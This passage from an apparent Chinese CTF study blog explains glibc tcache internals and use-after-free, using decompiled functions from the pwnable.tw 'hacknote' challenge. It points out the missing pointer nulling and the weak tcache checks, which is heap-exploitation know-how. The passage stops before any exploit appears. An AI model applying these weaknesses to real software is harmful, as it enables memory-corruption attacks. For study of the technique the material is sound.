class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><span class="hljs-comment">//指向的user-date部分嗷</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the</span><br><span class="hljs-comment">   per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping</span><br><span class="hljs-comment">   overall size low is mildly important.  Note that COUNTS and ENTRIES</span><br><span class="hljs-comment">   are redundant (we could have just counted the linked list each</span><br><span class="hljs-comment">   time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-keyword">static</span> __thread <span class="hljs-keyword">char</span> tcache_shutting_down = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></div></td></tr></table></figure><p>每个 thread 都会维护一个 <code>tcache_perthread_struct</code>，它是整个 tcache 的管理结构，一共有 <code>TCACHE_MAX_BINS</code> 个计数器和 <code>TCACHE_MAX_BINS</code>项 tcache_entry，其中</p><ul><li><code>tcache_entry</code> 用单向链表的方式链接了相同大小的处于空闲状态（free 后）的 chunk，这一点上和 fastbin 很像。</li><li><code>counts</code> 记录了 <code>tcache_entry</code> 链上空闲 chunk 的数目，每条链上最多可以有 7 个 chunk。</li></ul><h2 id="基本宏定义"><a href="#基本宏定义" class="headerlink" title="基本宏定义"></a>基本宏定义</h2><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* We want 64 entries.  This is an arbitrary limit, which tunables can reduce.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_MAX_BINS64</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> MAX_TCACHE_SIZEtidx2usize (TCACHE_MAX_BINS-1)</span><br><br><span class="hljs-comment">/* Only used to pre-fill the tunables.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> tidx2usize(idx)(((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)</span><br><br><span class="hljs-comment">/* When &quot;x&quot; is from chunksize().  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)</span><br><span class="hljs-comment">/* When &quot;x&quot; is a user-provided size.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> usize2tidx(x) csize2tidx (request2size (x))</span><br><br><span class="hljs-comment">/* With rounding and alignment, the bins are...</span><br><span class="hljs-comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span><br><span class="hljs-comment">   idx 1   bytes 25..40 or 13..20</span><br><span class="hljs-comment">   idx 2   bytes 41..56 or 21..28</span><br><span class="hljs-comment">   etc.  */</span><br><br><span class="hljs-comment">/* This is another arbitrary limit, which tunables can change.  Each</span><br><span class="hljs-comment">   tcache bin will hold at most this number of chunks.  */</span><br><span class="hljs-meta"># <span class="hljs-meta-keyword">define</span> TCACHE_FILL_COUNT 7</span><br></code></pre></div></td></tr></table></figure><ul><li>Tcache为每个线程都预留了这样一个特殊的bins， bin的数量是64个 每个bin中最多缓存7个chunk。在64位系统上以0x10的字节递增，<strong>从24递增到1032字节</strong>。32位系统上则<strong>从12到512字节</strong>，所以Tcache缓存的是<strong>非Large Chunk的chunk</strong> </li></ul><h2 id="工作方式"><a href="#工作方式" class="headerlink" title="工作方式"></a>工作方式</h2><ul><li>第一次 malloc 时，会先 malloc 一块内存用来存放 <code>tcache_perthread_struct</code> 。</li><li>free 内存，且 size 小于 small bin size 时</li><li>tcache 之前会放到 fastbin 或者 unsorted bin 中</li><li>tcache 后：<ul><li>先放到对应的 tcache 中，直到 tcache 被填满（默认是 7 个）</li><li>tcache 被填满之后，再次 free 的内存和之前一样被放到 fastbin 或者 unsorted bin 中</li><li>tcache 中的 chunk 不会合并（不取消 inuse bit）</li></ul></li><li>malloc 内存，且 size 在 tcache 范围内</li><li>先从 tcache 取 chunk，直到 tcache 为空</li><li>tcache 为空后，从 bin 中找</li><li>tcache 为空时，如果 <code>fastbin/smallbin/unsorted bin</code> 中有 size 符合的 chunk，会先把 <code>fastbin/smallbin/unsorted bin</code> 中的 chunk 放到 tcache 中，直到填满。之后再从 tcache 中取；因此 chunk 在 bin 中和 tcache 中的顺序会反过来</li></ul><h2 id="各个函数中关于tcache的部分"><a href="#各个函数中关于tcache的部分" class="headerlink" title="各个函数中关于tcache的部分"></a>各个函数中关于tcache的部分</h2><h3 id="–libc-malloc-1"><a href="#–libc-malloc-1" class="headerlink" title="–libc-malloc  "></a><a href="#__libc_malloc">–libc-malloc</a> <span id="libcmalloc"> </span></h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span> *<br>__libc_malloc (<span class="hljs-keyword">size_t</span> bytes)<br>&#123;<br>    ......<br>    ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  <span class="hljs-comment">/* int_free also calls request2size, be careful to not pad twice.  */</span><br>  <span class="hljs-keyword">size_t</span> tbytes;<br>  <span class="hljs-comment">// 根据 malloc 传入的参数计算 chunk 实际大小，并计算 tcache 对应的下标</span><br>  checked_request2size (bytes, tbytes);<br>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (tbytes);<br><br>  <span class="hljs-comment">// 初始化 tcache</span><br>  MAYBE_INIT_TCACHE (); <span class="hljs-comment">//如果为空就执行初始化函数</span><br>  DIAG_PUSH_NEEDS_COMMENT;<br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins  <span class="hljs-comment">// 根据 size 得到的 idx 在合法的范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// tcache-&gt;entries[tc_idx] 有 chunk</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    ......<br>    ......<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">tcache_init(<span class="hljs-keyword">void</span>)<br>&#123;<br>  mstate ar_ptr;<br>  <span class="hljs-keyword">void</span> *victim = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">const</span> <span class="hljs-keyword">size_t</span> bytes = <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct);<br>    <br>  <span class="hljs-keyword">if</span> (tcache_shutting_down)<br>    <span class="hljs-keyword">return</span>;<br>    <br>  arena_get (ar_ptr, bytes); <span class="hljs-comment">// 找到可用的 arena</span><br>  victim = _int_malloc (ar_ptr, bytes); <span class="hljs-comment">// 申请一个 sizeof(tcache_perthread_struct) 大小的 chunk</span><br>  <span class="hljs-keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="hljs-literal">NULL</span>)<span class="hljs-comment">//这是.....不成功再来一遍?????</span><br>    &#123;<br>      ar_ptr = arena_get_retry (ar_ptr, bytes);<br>      victim = _int_malloc (ar_ptr, bytes);<br>    &#125;<br>  <span class="hljs-keyword">if</span> (ar_ptr != <span class="hljs-literal">NULL</span>)<br>    __libc_lock_unlock (ar_ptr-&gt;mutex);<br>    <br>  <span class="hljs-comment">/* In a low memory situation, we may not be able to allocate memory</span><br><span class="hljs-comment">     - in which case, we just keep trying later.  However, we</span><br><span class="hljs-comment">     typically do this very early, so either there is sufficient</span><br><span class="hljs-comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span><br><span class="hljs-comment">     allocations anyway.  */</span><br>    <span class="hljs-comment">//注释说如果取不到的话就等会再试, 通常在内存空间小的情况下</span><br>  <span class="hljs-keyword">if</span> (victim) <span class="hljs-comment">// 初始化 tcache</span><br>    &#123;<br>      tcache = (tcache_perthread_struct *) victim;<br>      <span class="hljs-built_in">memset</span> (tcache, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> (tcache_perthread_struct));<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> MAYBE_INIT_TCACHE() \</span><br><span class="hljs-meta">  <span class="hljs-meta-keyword">if</span> (__glibc_unlikely (tcache == NULL)) \</span><br><span class="hljs-meta">    tcache_init();</span><br></code></pre></div></td></tr></table></figure><h3 id="申请内存-2-27"><a href="#申请内存-2-27" class="headerlink" title="申请内存 2.27"></a>申请内存 <u>2.27</u></h3><p>接下来将进入申请内存的步骤</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c">  <span class="hljs-comment">// 从 tcache list 中获取内存</span><br>  <span class="hljs-keyword">if</span> (tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 由 size 计算的 idx 在合法范围内</span><br>      <span class="hljs-comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="hljs-comment">/* to appease gcc */</span><br>      &amp;&amp; tcache<br>      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">// 该条 tcache 链不为空</span><br>    &#123;<br>      <span class="hljs-keyword">return</span> tcache_get (tc_idx);<br>    &#125;<br>  DIAG_POP_NEEDS_COMMENT;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  <span class="hljs-comment">// 进入与无 tcache 时的流程</span><br>  <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)<br>    &#123;<br>      victim = _int_malloc (&amp;main_arena, bytes);<br>      assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||<br>              &amp;main_arena == arena_for_chunk (mem2chunk (victim)));<br>      <span class="hljs-keyword">return</span> victim;<br>    &#125;<br></code></pre></div></td></tr></table></figure><ul><li>在 <code>tcache-&gt;entries</code> 不为空时，将进入 <code>tcache_get()</code> 的流程获取 chunk，否则与 tcache 机制前的流程类似，这里主要分析第一种 <code>tcache_get()</code>。这里也可以看出 tcache 的优先级很高，比 fastbin 还要高（ fastbin 的申请在没进入 tcache 的流程中）。</li></ul><h3 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get()"></a>tcache_get()</h3><p>看一下 <code>tcache_get()</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span><br><span class="hljs-comment">   available chunks to remove.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span> *</span><br><span class="hljs-function"><span class="hljs-title">tcache_get</span> <span class="hljs-params">(<span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]); <span class="hljs-comment">// 获得一个 chunk，counts 减一</span><br>  <span class="hljs-keyword">return</span> (<span class="hljs-keyword">void</span> *) e;<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>tcache_get()</code> 就是获得 chunk 的过程了。可以看出这个过程还是很简单的，从 <code>tcache-&gt;entries[tc_idx]</code> 中获得第一个 chunk，<code>tcache-&gt;counts</code> 减一，几乎没有任何保护。</li></ul><h3 id="libc-free-1"><a href="#libc-free-1" class="headerlink" title="__libc_free()"></a>__libc_free()</h3><p>看完申请，再看看有 tcache 时的释放</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">void</span><br>__libc_free (<span class="hljs-keyword">void</span> *mem)<br>&#123;<br>  ......<br>  ......<br>  MAYBE_INIT_TCACHE ();<br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>__libc_free()</code> 没有太多变化，<code>MAYBE_INIT_TCACHE ()</code> 在 tcache 不为空失去了作用。</li></ul><h3 id="int-free-1"><a href="#int-free-1" class="headerlink" title="_int_free()"></a>_int_free()</h3><p>跟进 <code>_int_free()</code> </p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span><br>_int_free (mstate av, mchunkptr p, <span class="hljs-keyword">int</span> have_lock)<br>&#123;<br>  ......<br>  ......<br><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span><br>  &#123;<br>    <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (size);<br>    <span class="hljs-keyword">if</span> (tcache<br>        &amp;&amp; tc_idx &lt; mp_.tcache_bins <span class="hljs-comment">// 64</span><br>        &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count) <span class="hljs-comment">// 7</span><br>      &#123;<br>        tcache_put (p, tc_idx);<br>        <span class="hljs-keyword">return</span>;<br>      &#125;<br>  &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>  ......<br>  ......<br></code></pre></div></td></tr></table></figure><ul><li>判断 <code>tc_idx</code> 合法，<code>tcache-&gt;counts[tc_idx]</code> 在 7 个以内时，就进入 <code>tcache_put()</code>，传递的两个参数是要释放的 chunk 和该 chunk 对应的 size 在 tcache 中的下标。</li></ul><h3 id="tcache-put"><a href="#tcache-put" class="headerlink" title="tcache_put()"></a>tcache_put()</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span><br><span class="hljs-comment">   for more chunks.  */</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> __always_inline <span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-keyword">size_t</span> tc_idx)</span></span><br><span class="hljs-function"></span>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></div></td></tr></table></figure><ul><li><code>tcache_puts()</code> 完成了把释放的 chunk 插入到 <code>tcache-&gt;entries[tc_idx]</code> 链表头部的操作，也几乎没有任何保护。并且 <strong>没有把 p 位置零</strong>。</li></ul><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p><ul><li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li><li>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li></ul><p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为 NULL 的内存指针为 dangling pointer。</strong> </p><h2 id="例子-–-pwnable-tw-hacknote"><a href="#例子-–-pwnable-tw-hacknote" class="headerlink" title="例子 – pwnable.tw_hacknote"></a>例子 – pwnable.tw_hacknote</h2><p>题目在 <a href="../../files/hacknote.zip">这里</a> 下载</p><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> root @ Kiprey <span class="hljs-keyword">in</span> ~/Desktop/Pwn [14:16:43]</span><br><span class="hljs-meta">$</span><span class="bash"> checksec hacknote</span>  <br>[*] &#x27;/root/Desktop/Pwn/hacknote&#x27;<br>    Arch:     i386-32-little<br>    RELRO:    Partial RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      No PIE (0x8048000)<br></code></pre></div></td></tr></table></figure><h2 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h2><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v0; <span class="hljs-comment">// ebx</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [esp+Ch] [ebp-1Ch]</span><br>  <span class="hljs-keyword">int</span> size; <span class="hljs-comment">// [esp+10h] [ebp-18h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [esp+14h] [ebp-14h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [esp+1Ch] [ebp-Ch]</span><br><br>  v5 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-keyword">if</span> ( dword_804A04C &lt;= <span class="hljs-number">5</span> )  <span class="hljs-comment">//最多放五个chunk</span><br>  &#123;<br>    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )<br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) ) <span class="hljs-comment">//如果该位置为空, 猜测应该是一个数组, 元素是指向chunk的指针</span><br>      &#123;<br>        *(&amp;ptr + i) = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8u</span>); <span class="hljs-comment">//malloc了八字节</span><br>        <span class="hljs-keyword">if</span> ( !*(&amp;ptr + i) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        *(_DWORD *)*(&amp;ptr + i) = sub_804862B; <br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Note size :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">8u</span>);<br>        size = atoi(buf);<br>        v0 = (<span class="hljs-keyword">int</span>)*(&amp;ptr + i);<br>        *(_DWORD *)(v0 + <span class="hljs-number">4</span>) = <span class="hljs-built_in">malloc</span>(size); <span class="hljs-comment">//这里可以知道数组元素指向一个结构体, 这个结构体有两个指针</span><br>          <span class="hljs-comment">//第一个是函数sub_804862B的指针, 第二个是content指针,malloc出来的</span><br>        <span class="hljs-keyword">if</span> ( !*((_DWORD *)*(&amp;ptr + i) + <span class="hljs-number">1</span>) )<br>        &#123;<br>          <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Alloca Error&quot;</span>);<br>          <span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content :&quot;</span>);<br>        read(<span class="hljs-number">0</span>, *((<span class="hljs-keyword">void</span> **)*(&amp;ptr + i) + <span class="hljs-number">1</span>), size);<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success !&quot;</span>);<br>        ++dword_804A04C;<br>        <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Full&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v5;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="delete"><a href="#delete" class="headerlink" title="delete"></a>delete</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">sub_80487D4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [esp+8h] [ebp-10h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v3; <span class="hljs-comment">// [esp+Ch] [ebp-Ch]</span><br><br>  v3 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4u</span>);<br>  v1 = atoi(buf);<br>  <span class="hljs-keyword">if</span> ( v1 &lt; <span class="hljs-number">0</span> || v1 &gt;= dword_804A04C )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(&amp;ptr + v1) )<br>  &#123;<br>    <span class="hljs-built_in">free</span>(*((<span class="hljs-keyword">void</span> **)*(&amp;ptr + v1) + <span class="hljs-number">1</span>));<span class="hljs-comment">//先freecontent</span><br>    <span class="hljs-built_in">free</span>(*(&amp;ptr + v1));<span class="hljs-comment">//再free chunk</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>); <span class="hljs-comment">//并未设置NULL</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> __readgsdword(<span class="hljs-number">0x14</span>u) ^ v3;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="print"><a href="#print" class="headerlink" title="print"></a>print</h3><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> <span class="hljs-title">print</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [esp+4h] [ebp-14h]</span><br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>]; <span 